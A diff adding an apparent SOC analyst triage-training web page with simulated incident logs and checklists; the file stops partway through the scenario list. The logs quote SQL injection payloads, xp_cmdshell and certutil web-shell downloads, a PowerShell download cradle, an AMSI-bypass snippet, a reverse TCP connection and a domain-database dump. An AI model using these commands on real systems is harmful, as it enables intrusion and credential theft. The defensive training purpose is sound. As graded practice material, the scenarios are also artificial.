@@ -1,0 +1,1507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<base target="_top">
+<title>L1 SOC Investigation &amp; Triage Practice</title>
+<style>
+  :root{
+    --bg:#10161d;
+    --panel:#161e27;
+    --panel-2:#1b2530;
+    --line:#28323d;
+    --text:#e6ecf2;
+    --muted:#8b98a8;
+    --accent:#4f9dd6;
+    --accent-dim:#2c4f68;
+    --ok:#4f9d7d;
+    --warn:#d99a4e;
+    --high:#e2703a;
+    --crit:#d1453b;
+    --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:var(--sans);}
+  body{padding:28px 16px 60px;}
+  .shell{max-width:960px;margin:0 auto;}
+
+  header.top{margin-bottom:18px;}
+  .eyebrow{font-size:12px;letter-spacing:.04em;color:var(--muted);margin:0 0 4px;}
+  h1{font-size:21px;margin:0 0 4px;font-weight:600;letter-spacing:-0.01em;}
+  .case-line{display:flex;align-items:baseline;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:10px;}
+  .case-line .count{color:var(--muted);font-size:13px;font-family:var(--mono);}
+
+  .ticks{display:flex;gap:3px;flex-wrap:wrap;margin-bottom:22px;}
+  .tick{width:16px;height:8px;border-radius:2px;background:var(--line);cursor:pointer;transition:transform .12s;}
+  .tick:hover{transform:scaleY(1.4);}
+  .tick.current{background:var(--accent);}
+  .tick.answered{background:#3a4756;}
+  .tick.correct{background:var(--ok);}
+  .tick.incorrect{background:var(--crit);}
+
+  .panel{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:16px 18px;margin-bottom:14px;}
+  .panel h2{font-size:13px;margin:0 0 12px;color:var(--muted);font-weight:600;letter-spacing:.02em;}
+
+  .meta-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:8px 18px;}
+  .meta-item{font-size:13px;}
+  .meta-item .k{color:var(--muted);font-size:11px;display:block;}
+  .meta-item .v{font-family:var(--mono);}
+  .sev-badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-family:var(--mono);font-weight:600;}
+  .sev-Low{background:#39424c;color:var(--text);}
+  .sev-Medium{background:var(--warn);color:#20150a;}
+  .sev-High{background:var(--high);color:#1a0a04;}
+  .sev-Critical{background:var(--crit);color:#1a0505;}
+
+  .titlebar{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:2px;}
+  .scen-title{font-size:16px;font-weight:600;}
+
+  pre.logblock{background:var(--panel-2);border:1px solid var(--line);border-radius:5px;padding:12px 14px;font-family:var(--mono);font-size:12.5px;line-height:1.5;overflow-x:auto;white-space:pre-wrap;word-break:break-word;margin:0 0 10px;}
+  pre.logblock:last-child{margin-bottom:0;}
+
+  details.checklist{margin-top:2px;}
+  details.checklist summary{cursor:pointer;color:var(--accent);font-size:13px;user-select:none;}
+  details.checklist ul{margin:10px 0 0;padding-left:20px;font-size:13px;color:var(--text);line-height:1.6;}
+
+  .field{margin-bottom:14px;}
+  .field label{display:block;font-size:12px;color:var(--muted);margin-bottom:5px;}
+  .field input[type=text], .field textarea, .field select{
+    width:100%;background:var(--panel-2);border:1px solid var(--line);border-radius:4px;
+    color:var(--text);font-family:var(--sans);font-size:13.5px;padding:8px 10px;
+  }
+  .field textarea{resize:vertical;min-height:52px;line-height:1.4;}
+  .field input:focus, .field textarea:focus, .field select:focus{outline:2px solid var(--accent);outline-offset:1px;border-color:var(--accent);}
+  .grid2{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:0 16px;}
+
+  fieldset{border:1px solid var(--line);border-radius:5px;padding:10px 12px 12px;margin:0 0 14px;}
+  fieldset legend{font-size:12px;color:var(--muted);padding:0 4px;}
+  .opt-row{display:flex;flex-wrap:wrap;gap:14px;margin-top:4px;}
+  .opt-row label{display:flex;align-items:center;gap:6px;font-size:13px;color:var(--text);cursor:pointer;}
+  .opt-row input{accent-color:var(--accent);}
+
+  .btnrow{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;margin-top:6px;}
+  .btnrow .left-group, .btnrow .right-group{display:flex;gap:8px;flex-wrap:wrap;}
+  button{font-family:var(--sans);font-size:13.5px;padding:9px 16px;border-radius:4px;border:1px solid var(--line);background:var(--panel-2);color:var(--text);cursor:pointer;}
+  button:hover{border-color:var(--accent);}
+  button.primary{background:var(--accent);border-color:var(--accent);color:#08131c;font-weight:600;}
+  button.primary:hover{opacity:.92;}
+  button:disabled{opacity:.4;cursor:default;}
+  button:disabled:hover{border-color:var(--line);}
+
+  .answerkey{margin-top:10px;padding:12px 14px;border-radius:5px;border:1px solid var(--line);background:var(--panel-2);font-size:13.5px;line-height:1.55;}
+  .answerkey .verdict-line{display:flex;gap:10px;align-items:center;margin-bottom:8px;flex-wrap:wrap;}
+  .pill{font-family:var(--mono);font-size:12px;padding:2px 8px;border-radius:3px;background:#243040;}
+  .pill.correct{background:var(--ok);color:#062017;}
+  .pill.incorrect{background:var(--crit);color:#210606;}
+  .pill.neutral{background:#3a4756;}
+
+  .summary-table{width:100%;border-collapse:collapse;font-size:13px;margin-top:10px;}
+  .summary-table th, .summary-table td{text-align:left;border-bottom:1px solid var(--line);padding:7px 8px;}
+  .summary-table th{color:var(--muted);font-weight:500;font-size:12px;}
+
+  .hint{font-size:12px;color:var(--muted);margin-top:2px;}
+
+  /* registration */
+  .gate{max-width:520px;margin:6vh auto 0;}
+  .gate .lead{font-size:14px;color:var(--muted);line-height:1.6;margin:0 0 18px;}
+  .gate .panel{padding:20px;}
+  .req{color:var(--high);}
+  .notice{font-size:12px;color:var(--muted);line-height:1.55;margin:12px 0 0;border-left:2px solid var(--accent-dim);padding-left:10px;}
+  .err{color:var(--crit);font-size:12.5px;margin-top:8px;min-height:16px;}
+
+  /* participant bar */
+  .whoami{display:flex;gap:10px;align-items:center;flex-wrap:wrap;font-size:12px;color:var(--muted);margin-bottom:10px;}
+  .whoami .name{color:var(--text);font-weight:600;}
+  .whoami .sid{font-family:var(--mono);}
+
+  /* score */
+  .scorebox{display:flex;align-items:baseline;gap:12px;margin:2px 0 14px;}
+  .scorebox .big{font-size:44px;font-weight:600;letter-spacing:-0.02em;line-height:1;}
+  .scorebox .of{font-size:15px;color:var(--muted);}
+  .submitstate{font-size:13px;margin-top:10px;line-height:1.5;}
+  .submitstate.ok{color:var(--ok);}
+  .submitstate.bad{color:var(--warn);}
+  .locked-note{font-size:12px;color:var(--muted);margin-top:6px;}
+  .field input.invalid, .field textarea.invalid, .field select.invalid{border-color:var(--crit);}
+  fieldset.invalid{border-color:var(--crit);}
+  .field label .req, fieldset legend .req{color:var(--high);}
+  .valmsg{font-size:12.5px;color:var(--crit);line-height:1.5;margin:2px 0 10px;}
+  .valmsg ul{margin:4px 0 0;padding-left:18px;}
+
+  /* leaderboard */
+  .stats{display:flex;gap:26px;flex-wrap:wrap;margin:0 0 16px;}
+  .stat .n{font-size:26px;font-weight:600;line-height:1.1;}
+  .stat .l{font-size:11px;color:var(--muted);}
+  .lb{width:100%;border-collapse:collapse;font-size:13.5px;}
+  .lb th,.lb td{text-align:left;padding:8px;border-bottom:1px solid var(--line);}
+  .lb th{color:var(--muted);font-weight:500;font-size:11.5px;}
+  .lb td.rank{font-family:var(--mono);color:var(--muted);width:38px;}
+  .lb td.num{font-family:var(--mono);}
+  .lb tr.you{background:rgba(79,157,214,.12);}
+  .lb tr.you td.rank{color:var(--accent);}
+  .lb tr.top td.rank{color:var(--text);font-weight:600;}
+  .bar{height:5px;background:var(--line);border-radius:3px;overflow:hidden;min-width:70px;}
+  .bar > span{display:block;height:100%;background:var(--accent);}
+  .bar.hard > span{background:var(--high);}
+  .empty{font-size:13.5px;color:var(--muted);line-height:1.6;}
+  .lb-foot{font-size:11.5px;color:var(--muted);margin-top:12px;}
+  .check-row{display:flex;gap:8px;align-items:flex-start;margin:2px 0 14px;font-size:13px;}
+  .check-row input{margin-top:2px;accent-color:var(--accent);}
+  .check-row label{line-height:1.45;cursor:pointer;}
+  .acct{display:flex;flex-direction:column;gap:2px;margin-bottom:14px;padding:9px 11px;
+        background:var(--panel-2);border:1px solid var(--line);border-radius:4px;}
+  .acct .k{font-size:11px;color:var(--muted);}
+  .acct .v{font-family:var(--mono);font-size:13.5px;}
+  .savestate{font-size:11.5px;color:var(--muted);font-family:var(--mono);}
+  .savestate.ok{color:var(--ok);}
+  .savestate.bad{color:var(--warn);}
+
+  @media (prefers-reduced-motion: reduce){ *{transition:none !important;} }
+  @media (max-width:600px){
+    .meta-grid{grid-template-columns:1fr 1fr;}
+    .grid2{grid-template-columns:1fr;}
+  }
+</style>
+</head>
+<body>
+<div class="shell">
+  <header class="top" id="topHeader" style="display:none;">
+    <p class="eyebrow">SOC L1 TRIAGE PRACTICE</p>
+    <h1>Investigation &amp; Triage Walkthrough</h1>
+    <div class="whoami" id="whoami"></div>
+    <div class="case-line">
+      <span class="count" id="caseCounter">Case 01 / 22</span>
+      <span class="count" id="scoreCounter"></span>
+    </div>
+    <div class="whoami"><span class="savestate" id="saveState"></span></div>
+    <div class="ticks" id="ticks"></div>
+  </header>
+
+  <div id="registerView"></div>
+  <div id="scenarioView" style="display:none;"></div>
+  <div id="summaryView" style="display:none;"></div>
+  <div id="leaderboardView" style="display:none;"></div>
+</div>
+
+<script>
+/* ==========================================================================
+   This file is served by the Apps Script web app (scoreboard.gs), not by a
+   web server. It talks to the server with google.script.run, so there is no
+   endpoint URL to configure and no CORS to work around.
+
+   Identity comes from the signed-in Google account, verified by the server.
+   Progress is stored server-side against that account, so an analyst can
+   close the tab, change device, and resume where they left off.
+   ========================================================================== */
+const SHOW_LEADERBOARD = true;
+
+/* A case appears in "most-missed" only once at least this many analysts have
+   scored it, so one unlucky attempt cannot make a case look hard. */
+const MISSED_MIN_ATTEMPTS = 3;
+
+const SCENARIOS = [
+ {
+  "id": "ALT-2026-0023",
+  "title": "SQL Injection with WAF Bypass on Citizen Portal",
+  "meta": {
+   "Ticket": "INC-2026-0023",
+   "Source": "Infinivan DC WAF / IIS / MSSQL Audit",
+   "Rule": "SQL Injection Pattern Detected",
+   "Severity": "High",
+   "Priority": "P1",
+   "Status": "Open",
+   "Asset": "PORTAL-WEB-02 / SQL-PORTAL-01",
+   "MITRE": "T1190 / T1505.003"
+  },
+  "logs": [
+   "[WAF - Infinivan DC WAF, sampled from 1,284 requests]\nRule ID: SQLI-generic-union-select\nSource IP: 45.132.x.x   (hosting provider, no PTR)\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/141.0.0.0\n\n14:02:11 GET /services/status.aspx?ref=1001' UNION SELECT 1,2,3--\n         -> 403 Blocked  (rule matched)\n14:02:19 GET /services/status.aspx?ref=1001'+UnIoN+SeLeCt+1,2,3--\n         -> 403 Blocked  (rule matched)\n14:04:02 GET /services/status.aspx?ref=1001'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--\n         -> 200 OK       (rule DID NOT match)\n14:04:44 GET /services/status.aspx?ref=1001'/**/UN/**/ION/**/SEL/**/ECT/**/\n             name,1,1/**/FR/**/OM/**/sysobjects/**/WH/**/ERE/**/xtype='U'--\n         -> 200 OK\n14:11:30 GET /services/status.aspx?ref=1001';/**/EX/**/EC/**/master..xp_cmdshell/**/\n             'whoami'--\n         -> 200 OK\n\nBlocked: 1,151    Allowed (200): 133",
+   "[IIS access log - PORTAL-WEB-02, same window]\n14:02:11 GET /services/status.aspx  403   sc-bytes 1,204\n14:04:02 GET /services/status.aspx  200   sc-bytes 4,902\n14:04:44 GET /services/status.aspx  200   sc-bytes 61,208   <-- response size jump\n14:11:30 GET /services/status.aspx  200   sc-bytes 2,140\n14:26:58 POST /uploads/temp/sys_upd.aspx  200  cs-bytes 8,912\n14:27:04 GET  /uploads/temp/sys_upd.aspx?cmd=whoami  200  sc-bytes 892\n\nBaseline sc-bytes for status.aspx: 3,800 - 5,200",
+   "[MSSQL audit - SQL-PORTAL-01]\n14:04:44  SELECT name FROM sysobjects WHERE xtype='U'\n          app=.Net SqlClient Data Provider  login=svc_portal_web\n14:11:30  EXEC master..xp_cmdshell 'whoami'\n          result: nt service\\\\mssqlserver\n14:19:07  EXEC master..xp_cmdshell 'net user'\n14:26:11  EXEC master..xp_cmdshell\n          'certutil -urlcache -f http://45.132.x.x/s.txt C:\\\\inetpub\\\\\n           wwwroot\\\\uploads\\\\temp\\\\sys_upd.aspx'\n\nxp_cmdshell configuration changed: 2026-09-15 14:09 (was disabled)\nsvc_portal_web role membership: db_owner, sysadmin",
+   "[Endpoint + network]\nEDR on PORTAL-WEB-02:\n  14:27:04  w3wp.exe -> cmd.exe /c whoami        (user: IIS APPPOOL\\\\portal)\n  14:31:52  w3wp.exe -> cmd.exe /c net group \"domain admins\" /domain\n  14:38:20  w3wp.exe -> powershell.exe -nop -w hidden -enc <BASE64>\n\nFirewall:\n  14:26:11  10.30.8.12 -> 45.132.x.x:80   ALLOW  (certutil download)\n  14:41:05  10.30.8.12 -> 45.132.x.x:443  ALLOW  out 41,204  in 8,120\n\nFile integrity monitoring:\n  New file  C:\\\\inetpub\\\\wwwroot\\\\uploads\\\\temp\\\\sys_upd.aspx  (8,912 bytes)\n  Directory /uploads/temp is world-writable (upload feature)"
+  ],
+  "checklist": [
+   "Did every request get blocked, or did any payload return HTTP 200?",
+   "What changed in the payloads between the blocked and the allowed requests?",
+   "Does the response size on the allowed requests differ from baseline?",
+   "What does the database audit show the successful queries actually did?",
+   "Was a file written to a web-accessible directory, and was it then requested?",
+   "What privileges does the application's database login hold, and why?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0024",
+  "title": "Sustained SQL Injection Attempts Against Procurement Portal",
+  "meta": {
+   "Ticket": "INC-2026-0024",
+   "Source": "Infinivan DC WAF",
+   "Rule": "SQL Injection / Command Injection",
+   "Severity": "High",
+   "Priority": "P2",
+   "Status": "Open",
+   "Asset": "PROC-WEB-01",
+   "MITRE": "T1190"
+  },
+  "logs": [
+   "[WAF summary]\nSource IP: 122.53.x.x   (PLDT, static business line)\nWindow: 2026-09-16 09:03 - 17:48 (continuous, with breaks 12:00-13:00)\nTotal requests matched: 9,214\nRules triggered: SQLi (6,102), command injection (1,988), path traversal (1,124)\nAction: Blocked 9,214 / Allowed 0\n\nSample payloads:\n  ?id=1' AND 1=CONVERT(int,@@version)--\n  ?id=1'; WAITFOR DELAY '0:0:5'--\n  ?file=../../../../windows/win.ini\n  ?cmd=|whoami\nUser-Agent: sqlmap/1.8.2#stable (https://sqlmap.org)",
+   "[Web server + application]\nPROC-WEB-01 IIS log: all 9,214 requests returned 403\nApplication error log: 0 unhandled exceptions in the window\nDatabase audit (PROC-DB-01): no queries originating from the portal\n  outside normal application patterns\nResponse time: unchanged from baseline throughout",
+   "[Source attribution]\n122.53.x.x\n  PTR: scan-node-01.secureph-assessment.com\n  Registered to: SecurePH Assessment Services Inc.\n  Seen in environment: first appearance 2026-09-16 09:03",
+   "[Engagement records]\nProcurement of Services PR-2026-0338:\n  \"Third-party web application penetration test, PhilGEPS-facing\n   portals. Vendor: SecurePH Assessment Services Inc.\n   Test window: 16-20 September 2026, 08:00-18:00 daily.\n   In-scope targets: PROC-WEB-01, PROC-WEB-02.\n   Source addresses: 122.53.x.x, 122.53.x.y\n   Rules of engagement: no DoS, no social engineering,\n   production testing permitted. Signed: ISO, 2026-09-08.\"\n\nSOC notification email from ISO dated 2026-09-12 listing the same\nwindow and source addresses. Not actioned into any suppression."
+  ],
+  "checklist": [
+   "Did any request succeed, or were all 9,214 blocked?",
+   "What does the User-Agent and PTR record say about the source?",
+   "Is the source address listed in any engagement or procurement record?",
+   "Does the timing pattern (office hours, lunch break) fit an automated attack?",
+   "Did the application or database show any effect from the traffic?",
+   "Was the SOC notified in advance, and was anything done with that notification?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0025",
+  "title": "Heavily Obfuscated PowerShell from Office Document",
+  "meta": {
+   "Ticket": "INC-2026-0025",
+   "Source": "Sysmon / PowerShell / Proxy",
+   "Rule": "Obfuscated PowerShell Execution",
+   "Severity": "High",
+   "Priority": "P1",
+   "Status": "Open",
+   "Asset": "LGU-WKS-0412",
+   "User": "a.gutierrez",
+   "MITRE": "T1059.001 / T1027 / T1566.001"
+  },
+  "logs": [
+   "[Sysmon EventID 1]\nTimestamp: 2026-09-17 10:12:44 +08:00\nComputer: LGU-WKS-0412\nUser: XXXDOMAIN\\\\a.gutierrez\nParentImage: C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\nParentCommandLine: \"WINWORD.EXE\" /n \"C:\\\\Users\\\\a.gutierrez\\\\Downloads\\\\\n                   Notice_of_Award_2026.docm\"\nImage: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\nCommandLine:\n  powershell -w 1 -nop -ep bypass \"$e=[char]0x65;$x=('I'+$e+'X');\n  $u=(('h'+'tt'+'p')+'://'+(45,132,7,19 -join '.')+'/a');\n  &(GCM ($x)) ((New-Object Net.WebClient).DownloadString($u))\"\nIntegrityLevel: Medium\nProcessId: 8812",
+   "[PowerShell EventID 4104 - script block, stage 2]\n$b64 = '<8,412 characters>'\n$gz  = [IO.Compression.GzipStream]::new(\n         [IO.MemoryStream][Convert]::FromBase64String($b64),\n         [IO.Compression.CompressionMode]::Decompress)\n...\n[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils')\n  .GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,$true)\n...\n$s = New-Object Net.Sockets.TCPClient('45.132.7.19',443)\n\nScript block logging captured 6 blocks; blocks 3-6 are the decompressed\nstage-2 payload. Splitting of 'AmsiUtils' and 'amsiInitFailed' across\nstring concatenation is an AMSI bypass technique.",
+   "[Sysmon 3 / 11 / 13 + proxy]\n10:12:51  NetworkConnect  powershell.exe -> 45.132.7.19:80\n10:12:53  FileCreate      C:\\\\Users\\\\a.gutierrez\\\\AppData\\\\Local\\\\Temp\\\\\n                          ~df9a12.tmp  (612 KB)\n10:13:02  RegistryEvent   HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\\n                          Run\\\\OfficeUpdater = powershell -w 1 -nop -ep bypass\n                          -f \"%LOCALAPPDATA%\\\\Temp\\\\~df9a12.tmp\"\n10:13:14  NetworkConnect  powershell.exe -> 45.132.7.19:443\n\nProxy: 45.132.7.19 uncategorised, first seen in environment today,\ndomain resolution absent (direct IP connection)",
+   "[Email + scope]\nMessage-ID <a41f...@mail-out-07.invoice-notices[.]net>\n  Subject: \"Notice of Award - Bid Ref 2026-0338\"\n  Attachment: Notice_of_Award_2026.docm (SHA256 3f9c1a...)\n  SPF: fail   DKIM: none   DMARC: none\n  Delivered to 34 mailboxes, opened by 3\n\nSame attachment hash on: LGU-WKS-0412, LGU-WKS-0388, FIN-WKS-0102\nSame registry Run value present on all 3\n45.132.7.19 contacted by all 3 hosts within 9 minutes"
+  ],
+  "checklist": [
+   "What is the parent process, and how did the document reach the user?",
+   "What obfuscation techniques appear in the command line and script blocks?",
+   "Does the script block show an AMSI tampering attempt?",
+   "Was persistence written, and where?",
+   "Is the destination resolvable, categorised, or previously seen?",
+   "How many hosts and mailboxes are affected?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0026",
+  "title": "Encoded PowerShell with Hidden Window Across 268 Endpoints",
+  "meta": {
+   "Ticket": "INC-2026-0026",
+   "Source": "Sysmon / SIEM",
+   "Rule": "Encoded PowerShell - Hidden Window",
+   "Severity": "High",
+   "Priority": "P2",
+   "Status": "Open",
+   "Asset": "268 endpoints",
+   "User": "SYSTEM",
+   "MITRE": "T1059.001"
+  },
+  "logs": [
+   "[Sysmon EventID 1 - representative of 268 near-identical events]\nComputer: DENR-WKS-0771\nUser: NT AUTHORITY\\\\SYSTEM\nParentImage: C:\\\\Program Files (x86)\\\\Microsoft Intune Management Extension\\\\\n             Microsoft.Management.Services.IntuneWindowsAgent.exe\nParentSigner: Microsoft Corporation (valid, countersigned)\nImage: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\nCommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass\n             -WindowStyle Hidden -EncodedCommand <BASE64, 2,104 chars>\nIntegrityLevel: System\nTimestamp: 2026-09-18 03:00:11 +08:00 (fleet spread 03:00 - 03:14)",
+   "[PowerShell EventID 4104 - decoded]\n# Intune proactive remediation: BitLocker compliance check\n$vol = Get-BitLockerVolume -MountPoint $env:SystemDrive\nif ($vol.ProtectionStatus -ne 'On') {\n    Write-Output \"NonCompliant\"; exit 1\n}\nWrite-Output \"Compliant\"; exit 0\n\nSingle block. No decode-and-execute, no string concatenation of\nAPI names, no compression, no network calls in the script itself.",
+   "[Network + file activity]\nOutbound connections made by these powershell.exe processes: 0\nFiles created: 0\nRegistry autoruns created: 0\nChild processes spawned: 0\nAverage process lifetime: 1.9 seconds\n\nThe only network activity in the window is the Intune agent's own\ncheck-in to manage.microsoft.com (Microsoft-owned range).",
+   "[Baseline and change record]\nIdentical pattern (same parent, same structure, 03:00 window):\n  daily, 255-275 endpoints, 86 of the last 90 days.\nAlert first fired: 2026-09-18.\nDetection rule \"Encoded PowerShell - Hidden Window\" deployed 2026-09-17.\n\nCHG-2026-0951 (Implemented, 2026-06-02):\n  \"Deploy Intune proactive remediation package: BitLocker\n   compliance check, all managed endpoints, nightly 03:00.\"\n"
+  ],
+  "checklist": [
+   "What is the parent process, and is it a signed management agent?",
+   "What does the encoded command decode to — does it download or execute anything?",
+   "Did the processes make any network connections or write any files?",
+   "Does a 90-day baseline show this as new behaviour or routine?",
+   "Why did the alert start firing on this specific date?",
+   "Would 268 simultaneous identical executions be plausible for an intrusion?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0027",
+  "title": "Obfuscated PowerShell Detected on Backup Servers",
+  "meta": {
+   "Ticket": "INC-2026-0027",
+   "Source": "Google SecOps (Chronicle)",
+   "Rule": "High-Entropy PowerShell Command Line",
+   "Severity": "High",
+   "Priority": "P2",
+   "Status": "Open",
+   "Asset": "BKP-SVR-01 / 02 / 03",
+   "User": "svc-backup",
+   "MITRE": "T1027"
+  },
+  "logs": [
+   "[Chronicle alert]\nRule: High-Entropy PowerShell Command Line\nFires when: Shannon entropy of the matched string > 4.2\nMatched field: udm.target.process.command_line\nSeverity assigned: High\nAlerts: 3 hosts, 1,412 events in 24h",
+   "[Matched event - full command line as normalized]\nudm.target.process.command_line:\n  \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"\n  -NoProfile -Command \"& 'C:\\\\Program Files\\\\Veeam\\\\Backup and Replication\\\\\n  Jobs\\\\a7f3e91c-4b8d-42fa-9e21-6c5d0f8b3a77\\\\\n  d41d8cd98f00b204e9800998ecf8427e\\\\job-runner.ps1' -JobId\n  a7f3e91c-4b8d-42fa-9e21-6c5d0f8b3a77 -RunId\n  0f9c2b71-88ae-4d36-b0a5-3e7f1c94d5e2\"\n\nThe high-entropy substrings are GUIDs and an MD5-named directory,\nnot encoded content.",
+   "[Script and process context]\njob-runner.ps1\n  Signed: Veeam Software Group GmbH, valid\n  Contents: plain PowerShell, no encoding, no compression,\n            no string concatenation of API names, 84 lines\nParent: VeeamJobManager.exe (signed, service-launched)\nNetwork: internal backup repository only (10.20.4.90)\nChild processes: none beyond the documented job steps",
+   "[Rule history and blast radius]\nRule deployed: 2026-09-14\nEntropy threshold chosen by testing against a sample of\nInvoke-Obfuscation output; not tested against legitimate\ncommand lines containing GUIDs.\n\nSince deployment, the rule has fired on:\n  BKP-SVR-01/02/03  (Veeam job GUIDs)         1,412 events\n  SCCM-MP01         (package GUIDs)             402 events\n  4 SQL servers     (backup set identifiers)    188 events\nGenuine obfuscated PowerShell detected by this rule: 0\n\nNote: ALT-2026-0025's real obfuscated command line scores 3.9 entropy\nand would NOT have triggered this rule."
+  ],
+  "checklist": [
+   "What in the command line is actually producing the high entropy?",
+   "Is the script encoded, compressed, or concatenated — or plain text?",
+   "Is the invoked script signed, and what launched it?",
+   "What has the rule fired on since deployment, and has it caught anything real?",
+   "Was the entropy threshold validated against legitimate command lines?",
+   "Would this rule have caught the genuinely obfuscated case in ALT-2026-0025?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0028",
+  "title": "Internal Password Spray Followed by Successful Logon",
+  "meta": {
+   "Ticket": "INC-2026-0028",
+   "Source": "Domain Controller / EDR / Firewall",
+   "Rule": "Multiple Authentication Failures Followed by Success",
+   "Severity": "Critical",
+   "Priority": "P1",
+   "Status": "Open",
+   "Asset": "DC-PH-01 / HR-WKS-0233",
+   "MITRE": "T1110.003 / T1078"
+  },
+  "logs": [
+   "[DC-PH-01 - authentication summary, 2026-09-19 01:12 - 02:48]\n4625 events: 3,412\nDistinct target accounts: 214\nSource workstation for all: HR-WKS-0233 (10.10.31.44)\nLogon Type: 3 (Network)\nAuthentication Package: NTLM\nSub Status distribution:\n  0xC000006A (bad password)        3,409\n  0xC0000064 (no such user)            3\nPattern: 1-2 attempts per account, cycling through accounts\n         alphabetically, ~1.7 seconds apart\n\n4624 events from same source in window: 1\n  01:58:22  Account: svc-fileaudit  Logon Type 3  NTLM  Success",
+   "[Post-authentication activity - svc-fileaudit]\n01:58:24  4672 Special privileges assigned to new logon\n            SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege\n01:59:41  4624 Type 3  svc-fileaudit -> FILE-SVR-01   from 10.10.31.44\n02:03:15  4624 Type 3  svc-fileaudit -> FILE-SVR-02   from 10.10.31.44\n02:11:07  4624 Type 3  svc-fileaudit -> DC-PH-02      from 10.10.31.44\n02:29:50  4688 on DC-PH-02: ntdsutil.exe \"ac i ntds\" \"ifm\"\n            \"create full C:\\\\Windows\\\\Temp\\\\ifm\" q q\n\nsvc-fileaudit baseline: authenticates to FILE-SVR-01 only,\nweekdays 22:00, never interactive, never to a domain controller.",
+   "[HR-WKS-0233 - EDR process telemetry]\n01:09:55  outlook.exe -> mshta.exe http://185.99.x.x/u.hta\n01:11:40  mshta.exe -> powershell.exe -nop -w hidden -enc <BASE64>\n01:12:03  powershell.exe -> spray.exe (unsigned, C:\\\\Users\\\\Public\\\\)\n            hash unknown to all configured intel sources\n01:12:04  spray.exe opens 214 outbound SMB sessions to 10.10.0.10 (DC-PH-01)\n02:52:18  powershell.exe -> 7z.exe a -p<redacted> C:\\\\Users\\\\Public\\\\i.7z\n            \\\\\\\\DC-PH-02\\\\C$\\\\Windows\\\\Temp\\\\ifm",
+   "[Firewall / egress]\n02:58:04  10.10.31.44 -> 185.99.x.x:443  ALLOW  out 412,882,104  in 9,204\n          duration 21 minutes, single TLS session\n          destination: hosting provider, no PTR, uncategorised\n\nDLP: no policy covering SMB-sourced archives\nAccount owner of HR-WKS-0233: m.delrosario (on leave since 2026-09-14)"
+  ],
+  "checklist": [
+   "How many accounts were targeted, and what does the attempt pattern look like?",
+   "Did any authentication succeed, and for which account?",
+   "What privileges did that account hold, and what did it do afterwards?",
+   "Does the successful account's behaviour match its baseline?",
+   "What was running on the source workstation before the spray started?",
+   "Was any data staged or transferred off the network?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0029",
+  "title": "Brute Force Alert on Branch Domain Controller",
+  "meta": {
+   "Ticket": "INC-2026-0029",
+   "Source": "SIEM Correlation",
+   "Rule": "Brute Force - Excessive Authentication Failures",
+   "Severity": "High",
+   "Priority": "P2",
+   "Status": "Open",
+   "Asset": "DC-BR-CEBU-01",
+   "User": "r.alonzo",
+   "MITRE": "T1110"
+  },
+  "logs": [
+   "[Correlation alert]\nRule: count(EventID=4625) > 50 within 5m, grouped by target account\nTriggered: 2026-09-20 08:41\nAccount: r.alonzo\nCounted failures: 312\nWindow: 08:36:02 - 08:40:58\nSource: 10.44.7.88 (BR-CEBU-WKS-0021)",
+   "[Raw 4625 events as stored, first six of 312]\n08:36:02.184  r.alonzo  0xC000006A  LogonProcess: NtLmSsp  collector: wef-01\n08:36:02.184  r.alonzo  0xC000006A  LogonProcess: NtLmSsp  collector: edr-fwd\n08:36:02.184  r.alonzo  0xC000006A  LogonProcess: NtLmSsp  collector: dc-agent\n08:36:47.902  r.alonzo  0xC000006A  LogonProcess: NtLmSsp  collector: wef-01\n08:36:47.902  r.alonzo  0xC000006A  LogonProcess: NtLmSsp  collector: edr-fwd\n08:36:47.902  r.alonzo  0xC000006A  LogonProcess: NtLmSsp  collector: dc-agent\n\nDistinct EventRecordIDs among the 312 events: 4\nDistinct timestamps to millisecond precision: 4",
+   "[The four underlying events, from the DC security log directly]\n08:36:02  4625  r.alonzo  0xC000006A  from BR-CEBU-WKS-0021\n08:36:47  4625  r.alonzo  0xC000006A  from BR-CEBU-WKS-0021\n08:38:11  4625  r.alonzo  0xC000006A  from BR-CEBU-WKS-0021\n08:40:58  4624  r.alonzo  Type 2  SUCCESS  from BR-CEBU-WKS-0021\n\nFour events total: three failures, then a successful interactive\nlogon at the user's own assigned workstation.",
+   "[Ingestion pipeline]\nDC-BR-CEBU-01 security events are forwarded by three paths:\n  1. Windows Event Forwarding subscription  (wef-01)\n  2. EDR agent log forwarding               (edr-fwd)\n  3. Native SIEM agent                      (dc-agent)\n\nAll three were enabled during the branch rebuild on 2026-09-19.\nDeduplication on EventRecordID: not configured for this log source.\n\nAlert volume on this DC: 0 before 2026-09-19, 47 since.\nEvery one resolves to the same 3x multiplication."
+  ],
